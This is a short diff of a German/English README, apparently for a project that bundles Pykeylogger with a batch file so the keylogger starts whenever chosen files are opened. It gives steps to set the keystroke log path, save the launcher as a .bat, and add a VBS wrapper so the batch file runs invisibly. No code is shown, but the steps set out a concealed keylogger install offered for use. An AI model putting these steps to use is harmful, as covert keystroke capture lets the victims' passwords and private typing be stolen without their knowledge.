@@ -2,8 +2,8 @@
 Pykeylogger in kombination mit cmd file zum gleichzeitigen öffnen von files und des keyloggers
 
 
-davor key logger text file pfad ("c:/keystrokes/") verändern auf gewünschten pfad in dem die keystrokes als .txt datei gespeichert werden
-in program die zwei z öffnenden pfade ändern 
+change  file path ("c:/keystrokes/") to your prefered path to save the keystroke text file  
+change the two paths in
 programm als .bat datei abspeichern
 
 danach vbs program integrieren damit die bat datei unsichtbar gestartet werden kann 
